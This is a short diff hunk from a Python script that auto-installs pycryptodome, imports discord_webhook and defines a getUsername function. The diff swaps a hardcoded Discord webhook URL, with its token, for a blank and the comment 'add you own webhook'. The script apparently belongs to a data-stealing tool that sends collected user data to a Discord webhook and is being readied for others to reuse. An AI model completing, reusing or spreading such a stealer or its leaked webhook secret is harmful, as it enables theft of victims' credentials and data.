@@ -22,8 +22,9 @@ except ImportError:
     os.system("pip install pycryptodome")
 
 from discord_webhook import DiscordWebhook
+# add you own webhook 
 
-WEBHOOK = 'https://discord.com/api/webhooks/1120814108070138016/ZwqgBe7UDi8zYlhMHgkblmU5xo7LcQpfewV4wpzn134nQx2FTYyWtPWVrrEFFHXRtH7l'
+WEBHOOK = ''
 
 def getUsername():
     try:
